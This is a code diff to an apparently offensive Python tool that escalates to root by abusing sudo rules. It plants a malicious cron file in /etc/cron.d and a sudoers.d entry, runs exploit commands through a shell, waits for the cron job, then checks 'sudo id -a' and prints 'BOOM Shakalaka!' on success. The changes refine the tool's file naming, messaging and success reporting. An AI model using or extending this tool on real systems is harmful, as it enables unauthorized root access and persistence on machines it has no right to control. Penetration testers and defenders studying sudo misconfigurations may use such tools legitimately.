@@ -71,13 +71,13 @@ directory = "Output"
 if not os.path.exists(directory):
     os.makedirs(directory)
 
+pid = os.getpid()
 # pwnit files	
 pwncron_script = "/tmp/pwncron"
-pwncron_crond = "/etc/cron.d/pwncron"
-pwnsudoers_file = "/etc/sudoers.d/pwnage"
+pwncron_crond = f"/etc/cron.d/pwncron{pid}"
+pwnsudoers_file = f"/etc/sudoers.d/pwnage{pid}"
 pwnage_script = "/tmp/pwnage.sh"
 
-pid = os.getpid()
 pwnage_complete_file = f"/tmp/pwnage_complete_{pid}"
 sudorules = {}
 
@@ -99,7 +99,8 @@ def sleep_and_display(seconds, trigger_file = ''):
     print()
 
 def pwnit(rule, exploit_cmd, pwnage_script_data, dry_run = False, comments = ""):
-        
+
+    rc = None    
     if dry_run:
         print(OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC)
         print(OKYELLOW + "\n[!] !!! SIMULATION !!!" + ENDC)
@@ -133,6 +134,9 @@ def pwnit(rule, exploit_cmd, pwnage_script_data, dry_run = False, comments = "")
         sleep(0.5)
 
     print(OKGREEN + "\n[!] Creating malicious cron file!" + ENDC)
+    if comments:
+        print(OKYELLOW + f"\n[!] Comment! {comments}" + ENDC)
+              
     if dry_run:
         print(OKBLUE + f"[+] Exploit It: " + ENDC)
         print(OKRED + f"[*] {exploit_cmd}" + ENDC)
@@ -140,7 +144,7 @@ def pwnit(rule, exploit_cmd, pwnage_script_data, dry_run = False, comments = "")
         call(exploit_cmd, shell=True)
         sleep(0.5)
 
-    print(OKGREEN + "\n[!] Wait for pwncron to run in 1 minute!\n  # Note: The cron watchdog timer may take up to 10 minutes to capture new entries" + ENDC)
+    print(OKGREEN + f"\n[!] Wait for {pwncron_script} to run in 1 minute!\n  # Note: The cron watchdog timer may take up to 10 minutes to capture new entries" + ENDC)
 
     if dry_run:
         print(OKBLUE + f"[+] Test if you have full root access: " + ENDC)
@@ -148,14 +152,20 @@ def pwnit(rule, exploit_cmd, pwnage_script_data, dry_run = False, comments = "")
     else:
         sleep_and_display(60, pwnage_complete_file)
         print(OKGREEN + "\n[!] OK! DO WE HAVE ROOT? sudo id -a" + ENDC)
-        call("sudo id -a",shell=True)
+        try:
+            rc = call("sudo id -a", timeout=3, shell=True)
+            if rc == 0:
+                rc = True
+                print(OKYELLOW + "\n[!] BOOM Shakalaka!" + ENDC)
+        except subprocess.TimeoutExpired:
+            rc = False
+            pass
         print("\n")
 
-    if comments:
-        print(OKYELLOW + f"\n[!] Comment! {comments}" + ENDC)
-              
     if dry_run:
         print(OKYELLOW + "\n-----------------------------------------------------------------------------------------------------------------------------" + ENDC)
+
+    return rc
 
 # Function for the y/n questions
 def ask_user(answer):
